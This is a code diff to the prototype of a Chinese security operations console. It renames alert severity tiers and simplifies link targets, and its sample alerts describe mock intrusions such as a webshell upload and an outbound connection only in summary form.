@@ -1530,7 +1530,7 @@
           </div>
           <footer class="hu-tff"><span>未受保护的主机装好客户端后才能选。</span><button type="button" class="kc-btn" onClick="{{ls.tfX}}">取消</button><button type="button" class="kc-btn pri" onClick="{{ls.tfOk}}">确定</button></footer>
         </div></div></sc-if>
-      <div class="hux-demo"><b>示例状态</b><sc-for list="{{em.dst}}" as="d" hint-placeholder-count="3"><button type="button" class="{{d.c}}" onClick="{{d.t}}">{{d.n}}</button></sc-for><span>原型切换用，正式页面按客户实际数据显示</span></div><sc-if value="{{em.sample}}" hint-placeholder-val="{{false}}"><div class="hux-sb"><i>示例</i><span>{{em.sbT}}</span><button type="button" class="kc-btn" onClick="{{em.sOff}}">退出示例</button></div></sc-if><sc-if value="{{em.on}}" hint-placeholder-val="{{false}}"><div class="hux-em"><section class="kc-card hux-gd"><sc-if value="{{em.nh}}" hint-placeholder-val="{{true}}"><div class="hux-ic"><svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M4 3H20C20.5523 3 21 3.44772 21 4V11H3V4C3 3.44772 3.44772 3 4 3ZM3 13H21V20C21 20.5523 20.5523 21 20 21H4C3.44772 21 3 20.5523 3 20V13ZM7 16V18H10V16H7ZM7 6V8H10V6H7Z"></path></svg></div></sc-if><sc-if value="{{em.na}}" hint-placeholder-val="{{false}}"><div class="hux-ic ok"><svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 1L20.2169 2.82598C20.6745 2.92766 21 3.33347 21 3.80217V13.7889C21 15.795 19.9974 17.6684 18.3282 18.7812L12 23L5.6718 18.7812C4.00261 17.6684 3 15.795 3 13.7889V3.80217C3 3.33347 3.32553 2.92766 3.78307 2.82598L12 1ZM16.4524 8.22183L11.5027 13.1716L8.67423 10.3431L7.26002 11.7574L11.5027 16L17.8666 9.63604L16.4524 8.22183Z"></path></svg></div></sc-if><h2>{{em.h}}</h2><p>{{em.p}}</p><sc-if value="{{em.nh}}" hint-placeholder-val="{{true}}"><div class="hux-cap"><sc-for list="{{em.caps}}" as="c" hint-placeholder-count="3"><div><b>{{c.n}}</b><small>{{c.d}}</small></div></sc-for></div></sc-if><ol class="hux-steps"><sc-for list="{{em.steps}}" as="s" hint-placeholder-count="3"><li class="{{s.c}}"><em>{{s.k}}</em><div><b>{{s.n}}</b><small>{{s.d}}</small></div><sc-if value="{{s.hasL}}" hint-placeholder-val="{{true}}"><a href="{{s.h}}">{{s.l}} ›</a></sc-if></li></sc-for></ol><div class="hux-btns"><sc-for list="{{em.btns}}" as="b" hint-placeholder-count="2"><a class="{{b.c}}" href="{{b.h}}">{{b.n}}</a></sc-for><button type="button" class="kc-btn" onClick="{{em.sOn}}">{{em.sBt}}</button></div></section><section class="kc-card hux-sp"><div class="hux-sph"><b>一次调查是什么样</b><span class="hux-tag">示例</span></div><p>出现告警后，威胁调查自动把同一台主机上的相关告警串起来</p><div class="hux-box"><div class="hux-bt"><span class="lv">紧急</span>WebShell 植入并反弹连接 · web-prod-01<small>6 条告警串成 1 次攻击</small></div><div class="hux-ch"><div class="hux-nd"><small>① 上传文件</small><b>POST /upload → shell.php</b></div><i class="hux-ar">›</i><div class="hux-nd"><small>② Web 进程</small><b>nginx → php-fpm</b></div><i class="hux-ar">›</i><div class="hux-nd r"><small>③ 执行命令</small><b>bash 下载 dropper</b></div><i class="hux-ar">›</i><div class="hux-nd r"><small>④ 外联</small><b>185.66.21.9</b></div></div></div><div class="hux-box kai-box sm"><p class="hux-ai"><i class="kai-ic sm" aria-hidden="true"></i><b>AI 研判</b>确认入侵，置信度 92%。攻击者利用上传接口写入 /tmp/shell.php，由 php-fpm 派生 bash 下载 dropper，并与 185.66.21.9 建立外联。</p></div><div class="hux-box"><div class="hux-bt">处置方案<small>确认研判后一键执行</small></div><ul class="hux-ps"><li><i></i>隔离主机 web-prod-01<span>网络</span></li><li><i></i>封禁 43.21.88.17 和 185.66.21.9<span>网络</span></li><li><i></i>隔离 /tmp/shell.php，结束 bash 进程<span>文件 · 进程</span></li></ul></div><button type="button" class="kc-btn pri hux-go" onClick="{{em.sOn}}">打开示例调查 ›</button></section></div></sc-if>
+      <div class="hux-demo"><b>示例状态</b><sc-for list="{{em.dst}}" as="d" hint-placeholder-count="3"><button type="button" class="{{d.c}}" onClick="{{d.t}}">{{d.n}}</button></sc-for><span>原型切换用，正式页面按客户实际数据显示</span></div><sc-if value="{{em.sample}}" hint-placeholder-val="{{false}}"><div class="hux-sb"><i>示例</i><span>{{em.sbT}}</span><button type="button" class="kc-btn" onClick="{{em.sOff}}">退出示例</button></div></sc-if><sc-if value="{{em.on}}" hint-placeholder-val="{{false}}"><div class="hux-em"><section class="kc-card hux-gd"><sc-if value="{{em.nh}}" hint-placeholder-val="{{true}}"><div class="hux-ic"><svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M4 3H20C20.5523 3 21 3.44772 21 4V11H3V4C3 3.44772 3.44772 3 4 3ZM3 13H21V20C21 20.5523 20.5523 21 20 21H4C3.44772 21 3 20.5523 3 20V13ZM7 16V18H10V16H7ZM7 6V8H10V6H7Z"></path></svg></div></sc-if><sc-if value="{{em.na}}" hint-placeholder-val="{{false}}"><div class="hux-ic ok"><svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 1L20.2169 2.82598C20.6745 2.92766 21 3.33347 21 3.80217V13.7889C21 15.795 19.9974 17.6684 18.3282 18.7812L12 23L5.6718 18.7812C4.00261 17.6684 3 15.795 3 13.7889V3.80217C3 3.33347 3.32553 2.92766 3.78307 2.82598L12 1ZM16.4524 8.22183L11.5027 13.1716L8.67423 10.3431L7.26002 11.7574L11.5027 16L17.8666 9.63604L16.4524 8.22183Z"></path></svg></div></sc-if><h2>{{em.h}}</h2><p>{{em.p}}</p><sc-if value="{{em.nh}}" hint-placeholder-val="{{true}}"><div class="hux-cap"><sc-for list="{{em.caps}}" as="c" hint-placeholder-count="3"><div><b>{{c.n}}</b><small>{{c.d}}</small></div></sc-for></div></sc-if><ol class="hux-steps"><sc-for list="{{em.steps}}" as="s" hint-placeholder-count="3"><li class="{{s.c}}"><em>{{s.k}}</em><div><b>{{s.n}}</b><small>{{s.d}}</small></div><sc-if value="{{s.hasL}}" hint-placeholder-val="{{true}}"><a href="{{s.h}}">{{s.l}} ›</a></sc-if></li></sc-for></ol><div class="hux-btns"><sc-for list="{{em.btns}}" as="b" hint-placeholder-count="2"><a class="{{b.c}}" href="{{b.h}}">{{b.n}}</a></sc-for><button type="button" class="kc-btn" onClick="{{em.sOn}}">{{em.sBt}}</button></div></section><section class="kc-card hux-sp"><div class="hux-sph"><b>一次调查是什么样</b><span class="hux-tag">示例</span></div><p>出现告警后，威胁调查自动把同一台主机上的相关告警串起来</p><div class="hux-box"><div class="hux-bt"><span class="lv">高危</span>WebShell 植入并反弹连接 · web-prod-01<small>6 条告警串成 1 次攻击</small></div><div class="hux-ch"><div class="hux-nd"><small>① 上传文件</small><b>POST /upload → shell.php</b></div><i class="hux-ar">›</i><div class="hux-nd"><small>② Web 进程</small><b>nginx → php-fpm</b></div><i class="hux-ar">›</i><div class="hux-nd r"><small>③ 执行命令</small><b>bash 下载 dropper</b></div><i class="hux-ar">›</i><div class="hux-nd r"><small>④ 外联</small><b>185.66.21.9</b></div></div></div><div class="hux-box kai-box sm"><p class="hux-ai"><i class="kai-ic sm" aria-hidden="true"></i><b>AI 研判</b>确认入侵，置信度 92%。攻击者利用上传接口写入 /tmp/shell.php，由 php-fpm 派生 bash 下载 dropper，并与 185.66.21.9 建立外联。</p></div><div class="hux-box"><div class="hux-bt">处置方案<small>确认研判后一键执行</small></div><ul class="hux-ps"><li><i></i>隔离主机 web-prod-01<span>网络</span></li><li><i></i>封禁 43.21.88.17 和 185.66.21.9<span>网络</span></li><li><i></i>隔离 /tmp/shell.php，结束 bash 进程<span>文件 · 进程</span></li></ul></div><button type="button" class="kc-btn pri hux-go" onClick="{{em.sOn}}">打开示例调查 ›</button></section></div></sc-if>
       <div class="{{em.layC}}">
         <sc-if value="{{ls.qOn}}" hint-placeholder-val="{{true}}"><section class="kc-card hu-q" aria-label="调查队列"><div class="hu-qh"><b>调查队列</b><span>{{ls.qHd}}</span><button type="button" class="hu-ib" aria-label="收起调查队列" onClick="{{ls.qT}}"><svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M10.8284 12.0007L15.7782 16.9504L14.364 18.3646L8 12.0007L14.364 5.63672L15.7782 7.05093L10.8284 12.0007Z"></path></svg></button></div>
           <label class="pi-q hu-qs"><svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M18.031 16.617l4.283 4.282-1.415 1.415-4.282-4.283A8.96 8.96 0 0 1 11 20c-4.968 0-9-4.032-9-9s4.032-9 9-9 9 4.032 9 9a8.96 8.96 0 0 1-1.969 5.617zm-2.006-.742A6.977 6.977 0 0 0 18 11c0-3.868-3.133-7-7-7-3.868 0-7 3.132-7 7 0 3.867 3.132 7 7 7a6.977 6.977 0 0 0 4.875-1.975l.15-.15z"></path></svg><input type="search" placeholder="搜索主机、IP 或事件" aria-label="搜索调查队列" value="{{ls.qq}}" onChange="{{ls.onQq}}"></label>
@@ -1921,8 +1921,8 @@ class Component extends DCLogic {
     '查看操作日志': 'DdosInstanceDetail.dc.html', '在防护日志中查看全部': 'DdosLogs.dc.html', '以表格查看': 'DdosLogs.dc.html', '告警联系人': 'DdosAlerts.dc.html',
     '从其他厂商迁移': 'SupTicketNew.dc.html', '去「访问分析」查看': 'GameAnalytics.dc.html', '掉线率': 'GameAnalytics.dc.html', '网站可用性': 'EyeUptime.dc.html',
     '去「攻击报表」查看': 'ScdnStats.dc.html', '今日拦截攻击': 'ScdnStats.dc.html', '流量包剩余': 'ScdnPlan.dc.html', '本月弹性费用': 'BillOverview.dc.html',
-    '上传新证书': 'ScdnCertsEdit.dc.html', '编辑配置': 'ScdnDomainDetail.dc.html', '4 个域名': 'DdosAccess.dc.html', '3 个端口': 'DdosAccess.dc.html?tab=p',
-    '续费到期资源': 'AcctSubs.dc.html?ft=exp', '提交工单': 'SupTicketNew.dc.html', '查看': 'DdosPolicy.dc.html',
+    '上传新证书': 'ScdnCertsEdit.dc.html', '编辑配置': 'ScdnDomainDetail.dc.html', '4 个域名': 'DdosAccess.dc.html', '3 个端口': 'DdosAccess.dc.html',
+    '续费到期资源': 'AcctSubs.dc.html', '提交工单': 'SupTicketNew.dc.html', '查看': 'DdosPolicy.dc.html',
     '用户中心': 'ConsoleHome.dc.html', '费用': 'BillOverview.dc.html', '游戏盾': 'GameAccess.dc.html', '德迅云眼': 'EyeRisk.dc.html', '服务器租用': 'IdcServers.dc.html', '查看全部产品与价格': 'AcctPurchase.dc.html',
     '监控报表': 'IdcServerDetail.dc.html', '查看拦截记录': 'ScdnBlocks.dc.html', '操作记录': 'IdcServerDetail.dc.html'
   };
@@ -2206,7 +2206,7 @@ class Component extends DCLogic {
     const done = (i, msg) => () => { S({ pd: Object.assign({}, this.state.pd || {}, { [i]: 1 }), shMd: '' }); toast(msg); };
     const HOST = {
       '正常': ['共 57 台，以下为最近检测的 5 台。', [['web-prod-02', '10.0.1.12', '持续检测中', 'kc-tag ok'], ['web-prod-03', '10.0.1.13', '持续检测中', 'kc-tag ok'], ['api-01', '10.0.2.21', '持续检测中', 'kc-tag ok'], ['cache-01', '10.0.3.31', '持续检测中', 'kc-tag ok'], ['db-01', '10.0.4.41', '持续检测中', 'kc-tag ok']]],
-      '有风险': ['', [['web-prod-01', '10.0.1.11', '紧急 2 · 高危 1', 'kc-tag err', '查看风险', () => toast('跳转到「web-prod-01」主机详情', 'info')], ['app-03', '10.0.2.23', '高危端口开放', 'kc-tag warn', '查看风险', () => toast('跳转到「app-03」主机详情', 'info')]]],
+      '有风险': ['', [['web-prod-01', '10.0.1.11', '高危 3', 'kc-tag err', '查看风险', () => toast('跳转到「web-prod-01」主机详情', 'info')], ['app-03', '10.0.2.23', '高危端口开放', 'kc-tag warn', '查看风险', () => toast('跳转到「app-03」主机详情', 'info')]]],
       '未受保护': ['共 6 台，按原因处理：能装的直接装，离线先排查，未授权去绑定。', [['web-new-03', '115.231.**.21', '未安装', 'kc-tag warn', '一键安装', () => openMd('install')], ['backup-02', '60.191.**.40', '已卸载', 'kc-tag warn', '重新安装', () => openMd('install')], ['web-new-04', '115.231.**.22', '部署失败', 'kc-tag warn', '重试安装', () => openMd('install')], ['cache-03', '10.0.3.33', '离线', 'kc-tag mut', '排查', () => toast('已发起连通性检测，约 1 分钟出结果', 'info')], ['app-06', '10.0.2.26', '检测过期', 'kc-tag warn', '立即检测', () => toast('已下发检测任务', 'info')], ['app-07', '10.0.2.27', '未授权', 'kc-tag warn', '绑定授权', () => toast('跳转到「授权管理」', 'info')]]],
       '接入中': ['新接入主机首次检测约需 10 分钟。', [['db-new-01', '10.0.4.61', '首次检测中', 'kc-tag info'], ['db-new-02', '10.0.4.62', '首次检测中', 'kc-tag info']]],
       '已停机': ['停机期间不检测，开机后自动恢复。', [['test-07', '10.0.9.17', '已停机 3 天', 'kc-tag mut']]],
@@ -2217,7 +2217,7 @@ class Component extends DCLogic {
     };
     const hostDw = (k) => ({ t: k + '的主机', p: HOST[k][0], h: ['主机', 'IP', '状态', '操作'], r: H(HOST[k][1]), lk: '在资产管理查看', lkGo: navT('资产管理') });
     const REC = [['EVT-0998', 'web-prod-01', '已解决', 'kc-tag ok', '恶意文件已阻断，复检通过'], ['EVT-1003', 'app-03', '已解决', 'kc-tag ok', '高危端口已关闭'], ['EVT-0999', 'cache-01', '待复检', 'kc-tag warn', '可疑进程已隔离'], ['EVT-1005', 'web-prod-02', '待复检', 'kc-tag warn', 'Nginx 已升级'], ['EVT-0990', 'api-01', '已忽略', 'kc-tag mut', '测试账号，已确认'], ['EVT-0981', 'backup-02', '旧环境归档', 'kc-tag mut', '重装前的 3 条风险']];
-    const recDw = (f) => ({ t: f ? '处置记录 · ' + f : '处置记录 · 近 7 天', p: f === '新发现' ? '近 7 天新发现 14 项，其中紧急 4 项。' : '', h: ['事件', '主机', '结果', '说明'],
+    const recDw = (f) => ({ t: f ? '处置记录 · ' + f : '处置记录 · 近 7 天', p: f === '新发现' ? '近 7 天新发现 14 项，其中高危 4 项。' : '', h: ['事件', '主机', '结果', '说明'],
       r: REC.filter((r) => !f || f === '新发现' || r[2] === f).map(([a, b, c, cc, d]) => ({ a, b, c, cc, o: '', go: undefined, d })).map((x) => Object.assign(x, { b: x.b + ' · ' + x.d })), lk: '查看全部处置记录', lkGo: navT('处置记录') });
     const DW = {
       score: { t: '评分详情', p: '安全评分 = 100 − 扣分。修复后下次检测时更新评分。', h: ['扣分项', '主机', '扣分', '操作'],
@@ -2308,10 +2308,10 @@ class Component extends DCLogic {
       if (st.shDw === 'ai') { const AM = { '异常登录': 'R1', 'OpenSSH 漏洞': 'R3', '客户端已卸载': 'U1' }; sx.dw.r.forEach((r) => { const id = AM[r.a]; if (id) { r.o = '查看'; r.go = GO('SecRiskDetail', {}, id); } }); }
       // 告警中心卡片：与列表同一份数据
       const pend = RK.filter((r) => PEND.indexOf(r.st) >= 0);
-      const AT = [['全部', ''], ['紧急', '紧急'], ['未受保护', '未受保护'], ['可疑', '可疑'], ['提醒', '提醒']];
+      const AT = [['全部', ''], ['高危', '高危'], ['未受保护', '未受保护'], ['中危', '中危'], ['低危', '低危']];
       const at = st.atab || '全部'; const ak = (AT.find((x) => x[0] === at) || AT[0])[1];
       sx.tabs = AT.map(([n, k]) => ({ n, c: pend.filter((r) => !k || r.lv === k).length, on: n === at, cls: n === at ? 'kc-tab on' : 'kc-tab', cc: 'kc-cnt', pick: () => this.setState({ atab: n }) }));
-      const ORD = { '紧急': 0, '未受保护': 1, '可疑': 2, '提醒': 3 };
+      const ORD = { '高危': 0, '未受保护': 1, '中危': 2, '低危': 3 };
       const RG2 = { R1: () => openDw('judge'), R3: () => openMd('fix'), U1: () => openMd('install'), R6: () => openMd('retry') };
       sx.rows = pend.filter((r) => !ak || r.lv === ak).sort((a, b) => ORD[a.lv] - ORD[b.lv]).slice(0, 6).map((r) => ({ lv: LVC[r.lv], lvT: r.lv, t: r.n, a: r.as, p: r.prod, sc: 'sh-st', st: r.st === '处置中' ? '自动清洗中' : r.st, tm: r.t.slice(-5) === '00:00' ? r.t.slice(0, 5) : r.t,
         dh: r.ext || '#', goD: r.ext ? undefined : GO('SecRiskDetail', {}, r.id), ah: '#', goA: r.ext ? GOX(r.ext) : r.hs.length > 1 ? GO('SecRiskDetail', {}, r.id) : HOSTGO(r.hs[0]),
@@ -2351,38 +2351,38 @@ class Component extends DCLogic {
     const HM = {}; HS.forEach((h) => { HM[h.n] = h; });
     // 风险：编号, 名称, 类型, 级别, 影响主机, 状态, 检测项, 来源产品, 发现时间, 近7天, AI 研判, 已验证, 外部链接, 资产, 主操作
     const R = [
-      ['R1', '异常登录', '入侵', '紧急', ['web-prod-01'], '待处理', '异常登录', '德迅安全卫士', '11-02 10:12', 1, 1, 0, '', '', 'AI 研判'],
-      ['R2', '可疑进程外联', '入侵', '可疑', ['web-prod-01'], '待处理', '威胁狩猎', '德迅安全卫士', '10-24 22:41', 0, 1, 0, '', '', '处理'],
-      ['R3', 'OpenSSH 远程代码执行漏洞', '漏洞', '紧急', ['web-prod-01'], '待处理', '漏洞检测', '德迅安全卫士', '10-21 03:00', 0, 1, 0, '', '', '一键修复'],
-      ['R4', 'Nginx 拒绝服务漏洞', '漏洞', '可疑', ['app-03'], '待处理', '漏洞检测', '德迅安全卫士', '10-20 03:00', 0, 1, 0, '', '', '一键修复'],
-      ['R5', 'sudo 本地提权漏洞', '漏洞', '提醒', ['web-prod-01'], '待处理', '漏洞检测', '德迅安全卫士', '10-18 03:00', 0, 0, 0, '', '', '一键修复'],
-      ['R6', '弱口令（3 个账号）', '基线', '可疑', ['web-prod-01'], '处置失败', '基线检查', '德迅安全卫士', '10-19 03:10', 0, 1, 0, '', '', '重试'],
-      ['R7', 'SSH 允许 root 直接登录', '基线', '提醒', ['web-prod-01', 'app-03'], '待处理', '基线检查', '德迅安全卫士', '10-19 03:10', 0, 0, 0, '', '', '一键加固'],
-      ['R8', '未设置密码有效期', '基线', '提醒', ['app-03'], '待处理', '基线检查', '德迅安全卫士', '10-19 03:10', 0, 0, 0, '', '', '一键加固'],
-      ['R9', '未开启操作审计日志', '基线', '提醒', ['app-03'], '待处理', '基线检查', '德迅安全卫士', '10-19 03:10', 0, 0, 0, '', '', '一键加固'],
-      ['R10', '/tmp 未单独挂载', '基线', '提醒', ['web-prod-01'], '待处理', '基线检查', '德迅安全卫士', '10-19 03:10', 0, 0, 0, '', '', '查看方法'],
-      ['R11', '高危端口 3389 对公网开放', '网络', '可疑', ['app-03'], '待处理', '网络防火墙', '德迅安全卫士', '10-22 11:05', 0, 1, 0, '', '', '关闭端口'],
+      ['R1', '异常登录', '入侵', '高危', ['web-prod-01'], '待处理', '异常登录', '德迅安全卫士', '11-02 10:12', 1, 1, 0, '', '', 'AI 研判'],
+      ['R2', '可疑进程外联', '入侵', '中危', ['web-prod-01'], '待处理', '威胁狩猎', '德迅安全卫士', '10-24 22:41', 0, 1, 0, '', '', '处理'],
+      ['R3', 'OpenSSH 远程代码执行漏洞', '漏洞', '高危', ['web-prod-01'], '待处理', '漏洞检测', '德迅安全卫士', '10-21 03:00', 0, 1, 0, '', '', '一键修复'],
+      ['R4', 'Nginx 拒绝服务漏洞', '漏洞', '中危', ['app-03'], '待处理', '漏洞检测', '德迅安全卫士', '10-20 03:00', 0, 1, 0, '', '', '一键修复'],
+      ['R5', 'sudo 本地提权漏洞', '漏洞', '低危', ['web-prod-01'], '待处理', '漏洞检测', '德迅安全卫士', '10-18 03:00', 0, 0, 0, '', '', '一键修复'],
+      ['R6', '弱口令（3 个账号）', '基线', '中危', ['web-prod-01'], '处置失败', '基线检查', '德迅安全卫士', '10-19 03:10', 0, 1, 0, '', '', '重试'],
+      ['R7', 'SSH 允许 root 直接登录', '基线', '低危', ['web-prod-01', 'app-03'], '待处理', '基线检查', '德迅安全卫士', '10-19 03:10', 0, 0, 0, '', '', '一键加固'],
+      ['R8', '未设置密码有效期', '基线', '低危', ['app-03'], '待处理', '基线检查', '德迅安全卫士', '10-19 03:10', 0, 0, 0, '', '', '一键加固'],
+      ['R9', '未开启操作审计日志', '基线', '低危', ['app-03'], '待处理', '基线检查', '德迅安全卫士', '10-19 03:10', 0, 0, 0, '', '', '一键加固'],
+      ['R10', '/tmp 未单独挂载', '基线', '低危', ['web-prod-01'], '待处理', '基线检查', '德迅安全卫士', '10-19 03:10', 0, 0, 0, '', '', '查看方法'],
+      ['R11', '高危端口 3389 对公网开放', '网络', '中危', ['app-03'], '待处理', '网络防火墙', '德迅安全卫士', '10-22 11:05', 0, 1, 0, '', '', '关闭端口'],
       ['U1', '客户端已卸载', '主机状态', '未受保护', ['backup-02'], '待处理', '客户端', '德迅安全卫士', '10-29 16:20', 0, 0, 0, '', '', '重新安装'],
-      ['W1', 'Web 高危漏洞', 'Web 安全', '紧急', [], '待处理', '网站监测', '德迅云眼', '11-02 09:30', 1, 0, 0, EYE, 'www.example.com', '修复'],
-      ['C1', 'CC 攻击未拦截', 'Web 攻击', '紧急', [], '待处理', 'CC 防护', 'SCDN', '11-02 10:41', 1, 0, 0, CDN, 'shop.example.com', '开启防护'],
-      ['D1', 'DDoS 攻击（UDP Flood）', 'DDoS 攻击', '可疑', [], '处置中', '流量清洗', 'DDoS 高防 IP', '11-02 10:24', 1, 0, 0, ATK, '高防-002', '查看'],
-      ['O1', '源站 IP 暴露', 'Web 安全', '可疑', [], '待处理', '源站保护', 'SCDN', '10-29 14:00', 1, 0, 0, CDN, 'shop.example.com', '查看'],
-      ['S1', 'SSL 证书 12 天后到期', '证书', '提醒', [], '待处理', '证书管理', 'SCDN', '10-28 09:00', 1, 0, 0, CERT, 'www.example.com', '续费'],
-      ['H1', '未开启 HTTPS', 'Web 安全', '提醒', [], '待处理', '证书管理', 'SCDN', '10-26 09:00', 0, 0, 0, CDN, 'm.example.com', '开启'],
-      ['EVT-0998', '恶意文件已阻断', '入侵', '紧急', ['web-prod-01'], '已解决', '病毒查杀', '德迅安全卫士', '10-31 14:02', 1, 0, 1, '', '', '查看'],
-      ['EVT-1003', '高危端口 22 对公网开放', '网络', '可疑', ['app-03'], '已解决', '网络防火墙', '德迅安全卫士', '10-30 11:20', 1, 0, 1, '', '', '查看'],
-      ['EVT-1001', 'Redis 未授权访问', '漏洞', '紧急', ['cache-01'], '已解决', '漏洞检测', '德迅安全卫士', '10-28 03:00', 1, 0, 1, '', '', '查看'],
-      ['EVT-0996', '挖矿程序', '入侵', '紧急', ['api-01'], '已解决', '病毒查杀', '德迅安全卫士', '10-27 23:10', 1, 0, 1, '', '', '查看'],
-      ['EVT-0997', 'Log4j 远程代码执行漏洞', '漏洞', '可疑', ['web-prod-02'], '已解决', '漏洞检测', '德迅安全卫士', '10-29 03:00', 1, 0, 0, '', '', '查看'],
-      ['EVT-1002', '账号异常提权', '入侵', '可疑', ['web-prod-03'], '已解决', '本地提权', '德迅安全卫士', '10-30 15:42', 1, 0, 0, '', '', '查看'],
-      ['EVT-1006', 'SSH 暴力破解', '入侵', '可疑', ['db-01'], '已解决', '网络防火墙', '德迅安全卫士', '11-01 02:15', 1, 0, 0, '', '', '查看'],
-      ['EVT-1000', '未设置登录失败锁定', '基线', '提醒', ['cache-01'], '已解决', '基线检查', '德迅安全卫士', '10-28 03:10', 1, 0, 0, '', '', '查看'],
-      ['EVT-1004', 'Docker API 未授权访问', '漏洞', '可疑', ['node-07'], '已解决', '漏洞检测', '德迅安全卫士', '10-31 03:00', 1, 0, 0, '', '', '查看'],
-      ['EVT-0999', '可疑进程已隔离', '入侵', '可疑', ['cache-01'], '待复检', '病毒查杀', '德迅安全卫士', '10-31 20:05', 1, 0, 0, '', '', '复检'],
-      ['EVT-1005', 'Nginx 版本过低', '漏洞', '提醒', ['web-prod-02'], '待复检', '漏洞检测', '德迅安全卫士', '11-01 03:00', 1, 0, 0, '', '', '复检'],
-      ['EVT-0990', '弱口令（测试账号）', '基线', '提醒', ['api-01'], '已忽略', '基线检查', '德迅安全卫士', '10-29 03:10', 1, 0, 0, '', '', '恢复'],
-      ['EVT-0995', '可疑进程（运维备份脚本）', '入侵', '提醒', ['db-01'], '已加白', '应用运行防护', '德迅安全卫士', '10-27 02:00', 1, 0, 0, '', '', '查看'], /* gap161 */
-      ['EVT-0981', '重装前的 3 条风险', '主机状态', '提醒', ['backup-02'], '已归档', '客户端', '德迅安全卫士', '10-28 10:00', 1, 0, 0, '', '', '查看']];
+      ['W1', 'Web 高危漏洞', 'Web 安全', '高危', [], '待处理', '网站监测', '德迅云眼', '11-02 09:30', 1, 0, 0, EYE, 'www.example.com', '修复'],
+      ['C1', 'CC 攻击未拦截', 'Web 攻击', '高危', [], '待处理', 'CC 防护', 'SCDN', '11-02 10:41', 1, 0, 0, CDN, 'shop.example.com', '开启防护'],
+      ['D1', 'DDoS 攻击（UDP Flood）', 'DDoS 攻击', '中危', [], '处置中', '流量清洗', 'DDoS 高防 IP', '11-02 10:24', 1, 0, 0, ATK, '高防-002', '查看'],
+      ['O1', '源站 IP 暴露', 'Web 安全', '中危', [], '待处理', '源站保护', 'SCDN', '10-29 14:00', 1, 0, 0, CDN, 'shop.example.com', '查看'],
+      ['S1', 'SSL 证书 12 天后到期', '证书', '低危', [], '待处理', '证书管理', 'SCDN', '10-28 09:00', 1, 0, 0, CERT, 'www.example.com', '续费'],
+      ['H1', '未开启 HTTPS', 'Web 安全', '低危', [], '待处理', '证书管理', 'SCDN', '10-26 09:00', 0, 0, 0, CDN, 'm.example.com', '开启'],
+      ['EVT-0998', '恶意文件已阻断', '入侵', '高危', ['web-prod-01'], '已解决', '病毒查杀', '德迅安全卫士', '10-31 14:02', 1, 0, 1, '', '', '查看'],
+      ['EVT-1003', '高危端口 22 对公网开放', '网络', '中危', ['app-03'], '已解决', '网络防火墙', '德迅安全卫士', '10-30 11:20', 1, 0, 1, '', '', '查看'],
+      ['EVT-1001', 'Redis 未授权访问', '漏洞', '高危', ['cache-01'], '已解决', '漏洞检测', '德迅安全卫士', '10-28 03:00', 1, 0, 1, '', '', '查看'],
+      ['EVT-0996', '挖矿程序', '入侵', '高危', ['api-01'], '已解决', '病毒查杀', '德迅安全卫士', '10-27 23:10', 1, 0, 1, '', '', '查看'],
+      ['EVT-0997', 'Log4j 远程代码执行漏洞', '漏洞', '中危', ['web-prod-02'], '已解决', '漏洞检测', '德迅安全卫士', '10-29 03:00', 1, 0, 0, '', '', '查看'],
+      ['EVT-1002', '账号异常提权', '入侵', '中危', ['web-prod-03'], '已解决', '本地提权', '德迅安全卫士', '10-30 15:42', 1, 0, 0, '', '', '查看'],
+      ['EVT-1006', 'SSH 暴力破解', '入侵', '中危', ['db-01'], '已解决', '网络防火墙', '德迅安全卫士', '11-01 02:15', 1, 0, 0, '', '', '查看'],
+      ['EVT-1000', '未设置登录失败锁定', '基线', '低危', ['cache-01'], '已解决', '基线检查', '德迅安全卫士', '10-28 03:10', 1, 0, 0, '', '', '查看'],
+      ['EVT-1004', 'Docker API 未授权访问', '漏洞', '中危', ['node-07'], '已解决', '漏洞检测', '德迅安全卫士', '10-31 03:00', 1, 0, 0, '', '', '查看'],
+      ['EVT-0999', '可疑进程已隔离', '入侵', '中危', ['cache-01'], '待复检', '病毒查杀', '德迅安全卫士', '10-31 20:05', 1, 0, 0, '', '', '复检'],
+      ['EVT-1005', 'Nginx 版本过低', '漏洞', '低危', ['web-prod-02'], '待复检', '漏洞检测', '德迅安全卫士', '11-01 03:00', 1, 0, 0, '', '', '复检'],
+      ['EVT-0990', '弱口令（测试账号）', '基线', '低危', ['api-01'], '已忽略', '基线检查', '德迅安全卫士', '10-29 03:10', 1, 0, 0, '', '', '恢复'],
+      ['EVT-0995', '可疑进程（运维备份脚本）', '入侵', '低危', ['db-01'], '已加白', '应用运行防护', '德迅安全卫士', '10-27 02:00', 1, 0, 0, '', '', '查看'], /* gap161 */
+      ['EVT-0981', '重装前的 3 条风险', '主机状态', '低危', ['backup-02'], '已归档', '客户端', '德迅安全卫士', '10-28 10:00', 1, 0, 0, '', '', '查看']];
     const TXT = {
       R1: ['web-prod-01 在 10:12 被 45.142.xx.xx（荷兰）以 root 登录，此前 1 小时该 IP 尝试登录 312 次，登录后下载并执行了 /tmp/.x。', '先确认是不是本人登录。不是本人：封禁该 IP、修改 root 密码，并对主机做一次全面检测。', [['来源 IP', '45.142.xx.xx · 荷兰'], ['登录账号', 'root'], ['登录前', '1 小时内失败 312 次']]],
       R2: ['威胁狩猎发现 web-prod-01 上的进程 /tmp/.x 持续连接境外地址 45.142.xx.xx:4444，与异常登录为同一来源。', '终止进程并隔离文件，再检查计划任务和启动项里有没有同名程序。', [['进程', '/tmp/.x（PID 26796）'], ['外联地址', '45.142.xx.xx:4444']]],
@@ -2399,7 +2399,7 @@ class Component extends DCLogic {
     };
     const RK = R.map(([id, n, ty, lv, hs, st, src, prod, t, d7, ai, ver, ext, as, act]) => Object.assign({ id, n, ty, lv, hs, st, src, prod, t, d7: !!d7, ai: !!ai, ver: !!ver, ext, as: as || (hs.length > 1 ? hs[0] + ' 等 ' + hs.length + ' 台' : hs[0] || ''), act },
       { desc: (TXT[id] || [])[0] || n + '，详细信息见处置记录。', fix: (TXT[id] || [])[1] || '', kv: ((TXT[id] || [])[2] || []).map(([k, v]) => ({ k, v })) }));
